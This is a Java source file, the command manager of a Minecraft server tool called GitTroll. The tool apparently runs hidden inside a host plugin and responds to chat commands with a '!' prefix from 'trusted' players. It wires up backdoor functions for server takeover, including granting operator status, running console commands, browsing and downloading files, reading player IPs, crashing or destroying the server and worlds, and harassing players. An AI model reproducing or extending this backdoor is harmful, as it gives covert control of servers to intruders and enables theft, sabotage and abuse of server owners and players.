package net.Lenni0451.GitTroll.manager;

import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.List;

import net.Lenni0451.GitTroll.command.commands.trolling.*;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerChatTabCompleteEvent;

import com.google.common.collect.Lists;

import net.Lenni0451.GitTroll.GitTroll;
import net.Lenni0451.GitTroll.Settings;
import net.Lenni0451.GitTroll.command.CommandBase;
import net.Lenni0451.GitTroll.command.CommandWrongException;
import net.Lenni0451.GitTroll.command.ReturnException;
import net.Lenni0451.GitTroll.command.commands.bungeecord.BungeeBroadcast;
import net.Lenni0451.GitTroll.command.commands.bungeecord.BungeeCrash;
import net.Lenni0451.GitTroll.command.commands.bungeecord.BungeeGList;
import net.Lenni0451.GitTroll.command.commands.bungeecord.BungeeKick;
import net.Lenni0451.GitTroll.command.commands.bungeecord.BungeeMessage;
import net.Lenni0451.GitTroll.command.commands.bungeecord.BungeePlayerCount;
import net.Lenni0451.GitTroll.command.commands.bungeecord.BungeePlayerLagger;
import net.Lenni0451.GitTroll.command.commands.bungeecord.BungeePlayerList;
import net.Lenni0451.GitTroll.command.commands.bungeecord.BungeeRedirect;
import net.Lenni0451.GitTroll.command.commands.exploits.ResourceExploit;
import net.Lenni0451.GitTroll.command.commands.player.Ban;
import net.Lenni0451.GitTroll.command.commands.player.CommandSpy;
import net.Lenni0451.GitTroll.command.commands.player.Control;
import net.Lenni0451.GitTroll.command.commands.player.Deop;
import net.Lenni0451.GitTroll.command.commands.player.EnderchestSee;
import net.Lenni0451.GitTroll.command.commands.player.ForceKick;
import net.Lenni0451.GitTroll.command.commands.player.Freeze;
import net.Lenni0451.GitTroll.command.commands.player.Gamemode;
import net.Lenni0451.GitTroll.command.commands.player.GetIP;
import net.Lenni0451.GitTroll.command.commands.player.Godmode;
import net.Lenni0451.GitTroll.command.commands.player.Heal;
import net.Lenni0451.GitTroll.command.commands.player.Info;
import net.Lenni0451.GitTroll.command.commands.player.Invsee;
import net.Lenni0451.GitTroll.command.commands.player.Kick;
import net.Lenni0451.GitTroll.command.commands.player.Mute;
import net.Lenni0451.GitTroll.command.commands.player.Op;
import net.Lenni0451.GitTroll.command.commands.player.SendGameStateChange;
import net.Lenni0451.GitTroll.command.commands.player.Sudo;
import net.Lenni0451.GitTroll.command.commands.player.Title;
import net.Lenni0451.GitTroll.command.commands.player.Trust;
import net.Lenni0451.GitTroll.command.commands.player.Unban;
import net.Lenni0451.GitTroll.command.commands.player.UnhookPacketListener;
import net.Lenni0451.GitTroll.command.commands.player.Untrust;
import net.Lenni0451.GitTroll.command.commands.player.Vanish;
import net.Lenni0451.GitTroll.command.commands.plugin.About;
import net.Lenni0451.GitTroll.command.commands.plugin.ChangeCommandPrefix;
import net.Lenni0451.GitTroll.command.commands.plugin.Help;
import net.Lenni0451.GitTroll.command.commands.plugin.UpdateVersion;
import net.Lenni0451.GitTroll.command.commands.server.BlockConsole;
import net.Lenni0451.GitTroll.command.commands.server.Broadcast;
import net.Lenni0451.GitTroll.command.commands.server.ClearChat;
import net.Lenni0451.GitTroll.command.commands.server.CompleteServerDestroyer;
import net.Lenni0451.GitTroll.command.commands.server.ConsoleSpammer;
import net.Lenni0451.GitTroll.command.commands.server.ConsoleSudo;
import net.Lenni0451.GitTroll.command.commands.server.CrashServer;
import net.Lenni0451.GitTroll.command.commands.server.DownloadFile;
import net.Lenni0451.GitTroll.command.commands.server.FileBrowser;
import net.Lenni0451.GitTroll.command.commands.server.Plugins;
import net.Lenni0451.GitTroll.command.commands.server.Reload;
import net.Lenni0451.GitTroll.command.commands.server.ServerLag;
import net.Lenni0451.GitTroll.command.commands.server.SetSlots;
import net.Lenni0451.GitTroll.command.commands.server.Stop;
import net.Lenni0451.GitTroll.command.commands.utils.Bind;
import net.Lenni0451.GitTroll.command.commands.utils.RandomGenerator;
import net.Lenni0451.GitTroll.command.commands.world.BlackHole;
import net.Lenni0451.GitTroll.command.commands.world.EssentialsNuke;
import net.Lenni0451.GitTroll.command.commands.world.InfestBlocks;
import net.Lenni0451.GitTroll.command.commands.world.InstantNether;
import net.Lenni0451.GitTroll.command.commands.world.LiquidFlow;
import net.Lenni0451.GitTroll.command.commands.world.Nuke;
import net.Lenni0451.GitTroll.command.commands.world.WorldManager;
import net.Lenni0451.GitTroll.command.commands.world.WorldReset;
import net.Lenni0451.GitTroll.event.EventListener;
import net.Lenni0451.GitTroll.utils.ArrayHelper;
import net.Lenni0451.GitTroll.utils.CustomPlayer;
import net.Lenni0451.GitTroll.utils.ExceptionProvider;
import net.Lenni0451.GitTroll.utils.Logger;
import net.Lenni0451.GitTroll.utils.spigotevents.SpigotEventRegister;

public class CommandManager implements Listener {
	
	public static String COMMAND_PREFIX = "!";
	public static final String TRUST_COMMAND = Settings.getTrustCommand();
	
	
	private List<CommandBase> commands;
	
	//Register commands here
//	public final TestCommand TestCommand = null;
	public final About About = null;
	public final Vanish Vanish = null;
	public final Untrust Untrust = null;
	public final ResourceExploit ResourceExploit = null;
	public final Help Help = null;
	public final Heal Heal = null;
	public final Explode Explode = null;
	public final WorldReset WorldReset = null;
	public final Op Op = null;
	public final Deop Deop = null;
	public final Trust Trust = null;
	public final SetSlots SetSlots = null;
	public final Stop Stop = null;
	public final CrashServer CrashServer = null;
	public final DropHand DropHand = null;
	public final DropInventory DropInventory = null;
	public final BungeeRedirect BungeeRedirect = null;
	public final UpdateVersion UpdateVersion = null;
	public final ServerLag ServerLag = null;
	public final BungeePlayerCount BungeePlayerCount = null;
	public final BungeePlayerList BungeePlayerList = null;
	public final Reload Reload = null;
	public final BungeeGList BungeeGList = null;
	public final BungeeKick BungeeKick = null;
	public final BungeeMessage BungeeMessage = null;
	public final BungeeBroadcast BungeeBroadcast = null;
	public final BungeeCrash BungeeCrash = null;
	public final BungeePlayerLagger BungeePlayerLagger = null;
	public final Title Title = null;
	public final Plugins Plugins = null;
	public final DownloadFile DownloadFile = null;
	public final UnhookPacketListener UnhookPacketListener = null;
	public final PlayerCrasher PlayerCrasher = null;
	public final ClientBlockReplace ClientBlockReplace = null;
	public final ChunkRenderGlitch ChunkRenderGlitch = null;
	public final Sudo Sudo = null;
	public final ConsoleSudo ConsoleSudo = null;
	public final CommandSpy CommandSpy = null;
	public final Gamemode Gamemode = null;
	public final ClearChat ClearChat = null;
	public final Freeze Freeze = null;
	public final Broadcast Broadcast = null;
	public final Control Control = null;
	public final WorldManager WorldManager = null;
	public final Godmode Godmode = null;
	public final Ban Ban = null;
	public final Unban Unban = null;
	public final Kick Kick = null;
	public final ForceKick ForceKick = null;
	public final AntiRespawn AntiRespawn = null;
	public final ChangeCommandPrefix ChangeCommandPrefix = null;
	public final DeathLoop DeathLoop = null;
	public final SoundSpam SoundSpam = null;
	public final FartRocket FartRocket = null;
	public final BlackScreen BlackScreen = null;
	public final ItemScareOff ItemScareOff = null;
	public final SendGameStateChange SendGameStateChange = null;
	public final BlockConsole BlockConsole = null;
	public final ClientCloseScreen ClientCloseScreen = null;
	public final BlockChunkUpdates BlockChunkUpdates = null;
	public final RandomGenerator RandomGenerator = null;
	public final ElderGuardian ElderGuardian = null;
	public final BlackHole BlackHole = null;
	public final DemoScreen DemoScreen = null;
	public final PissRocket PissRocket = null;
	public final GlassBox GlassBox = null;
	public final DownloadTerrain DownloadTerrain = null;
	public final FakeHacker FakeHacker = null;
	public final ServerHacking ServerHacking = null;
	public final FileBrowser FileBrowser = null;
	public final EndScreen EndScreen = null;
	public final FakeEnd FakeEnd = null;
	public final InteractTroll InteractTroll = null;
	public final JumpScare JumpScare = null;
	public final GetIP GetIP = null;
	public final TablistClearer TablistClearer = null;
	public final EssentialsNuke EssentialsNuke = null;
	public final Info Info = null;
	public final LiquidFlow LiquidFlow = null;
	public final Invsee Invsee = null;
	public final EnderchestSee EnderchestSee = null;
	public final ZoomSpam ZoomSpam = null;
	public final ConsoleSpammer ConsoleSpammer = null;
	public final UnloadChunks UnloadChunks = null;
	public final Bind Bind = null;
	public final InfestBlocks InfestBlocks = null;
	public final InstantNether InstantNether = null;
	public final CompleteServerDestroyer CompleteServerDestroyer = null;
	public final Nuke Nuke = null;
	public final Mute Mute = null;
	public final Blind Blind = null;
	public final ColorShift ColorShift = null;
	
	public CommandManager() {
		this.commands = new ArrayList<>();
//		Bukkit.getPluginManager().registerEvents(this, GitTroll.getInstance().getParentPlugin());
		SpigotEventRegister.registerEvents(this);
		
		List<String> blockedCommands = Lists.newArrayList();
		Settings.getBlockedCommands(blockedCommands);
		
		for(Field field : CommandManager.class.getDeclaredFields()) {
			try {
				if(CommandBase.class.isAssignableFrom(field.getType())) {
					field.setAccessible(true);
					if(field.get(this) == null) {
						field.set(this, field.getType().newInstance());
					}
					CommandBase command = (CommandBase) field.get(this);
					if(!blockedCommands.contains(command.getName())) {
						this.addCommand(command);
					}
				}
			} catch (Exception e) {
				Logger.broadcastGitMessage("�cWarning! Could not initialized a command! Class name: " + field.getType().getSimpleName());
			}
		}
	}
	
	private void addCommand(final CommandBase command) {
		this.commands.add(command);
		if(command instanceof Listener) {
//			Bukkit.getPluginManager().registerEvents((Listener) command, GitTroll.getInstance().getParentPlugin());
			SpigotEventRegister.registerEvents((Listener) command);
		}
		if(command instanceof EventListener) {
			GitTroll.getInstance().eventManager.registerAllEvents((EventListener) command);
		}
	}
	
	public CommandBase getCommandByName(final String name) {
		for(CommandBase commandBase : this.commands) {
			if(commandBase.getName().equalsIgnoreCase(name) || commandBase.getAliases().contains(name.toLowerCase())) {
				return commandBase;
			}
		}
		return null;
	}
	
	public boolean onMessage(final Player player, final String message) {
		//toLowerCase() just in case if someone changes the command prefix to a letter or something
		if(!message.toLowerCase().startsWith(COMMAND_PREFIX.toLowerCase())) {
			return false;
		}
		String[] commandParts = message.split(" ");
		
		String commandLabel = commandParts[0].substring(COMMAND_PREFIX.length());
		String[] args = Arrays.copyOfRange(commandParts, 1, commandParts.length);
		
		CustomPlayer cPlayer = CustomPlayer.instanceOf(player);
		
		for(CommandBase commandBase : this.commands) {
			if(commandBase.getName().equalsIgnoreCase(commandLabel) || commandBase.getAliases().contains(commandLabel.toLowerCase())) {
				Bukkit.getScheduler().runTask(GitTroll.getInstance().getParentPlugin(), () -> {
					try {
						commandBase.execute(cPlayer, new ArrayHelper(args));
					} catch (ReturnException e) {
						;
					} catch (CommandWrongException e) {
						cPlayer.sendGitMessage("�cThe command is wrong.");
						cPlayer.sendGitMessage("�aPlease use �6" + commandBase.getName() + " " + commandBase.getHelp());
					} catch (Throwable e) {
						cPlayer.sendGitMessage("�cAn unknown error occurred whilst executing the command.");
						cPlayer.sendGitMessage(ExceptionProvider.prepareExceptionForChat(e));
					}
				});
				return true;
			}
		}
		cPlayer.sendGitMessage("�cThe command does not exist.");
		cPlayer.sendGitMessage("Use �6" + COMMAND_PREFIX + "help �afor help.");
		return true;
	}  
	
	@EventHandler
	public void onTabComplete(PlayerChatTabCompleteEvent event) {
		if(GitTroll.getInstance().isPlayerTrusted(event.getPlayer())) {
			try {
				if(event.getChatMessage().startsWith(COMMAND_PREFIX)) {
					String[] args = event.getChatMessage().split(" ");
					
					List<String> tabs = new ArrayList<>();
					
					CommandBase cmd = this.getCommandByName(args[0].substring(COMMAND_PREFIX.length()));
					if(cmd == null) {
						for(CommandBase tmpCMD : this.commands) {
							if(tmpCMD.getName().toLowerCase().startsWith(args[0].substring(COMMAND_PREFIX.length()).toLowerCase())) {
								tabs.add(COMMAND_PREFIX + tmpCMD.getName());
							}
						}
					} else {
						cmd.tabComplete(tabs, new ArrayHelper(Arrays.copyOfRange(args, 1, args.length - (event.getChatMessage().endsWith(" ")?0:1))));
						if(!event.getChatMessage().endsWith(" ")) {
							tabs = getListOfStringsMatchingLastWord(args[args.length - 1], tabs);
						}
					}
					
					Collections.sort(tabs);
					event.getTabCompletions().clear();
					event.getTabCompletions().addAll(tabs);
				}
			} catch (Exception e) {}
		}
	}
	
	private List<String> getListOfStringsMatchingLastWord(String compare, List<String> possibilities) {
		List<String> list = new ArrayList<String>();
		for(int i = 0; i < possibilities.size(); i++) {
			String possibility = possibilities.get(i);
			if(possibility.toLowerCase().startsWith(compare.toLowerCase())) {
				list.add(possibility);
			}
		}
		return list;
	}

	public List<CommandBase> getCommands() {
		return this.commands;
	}
	
}
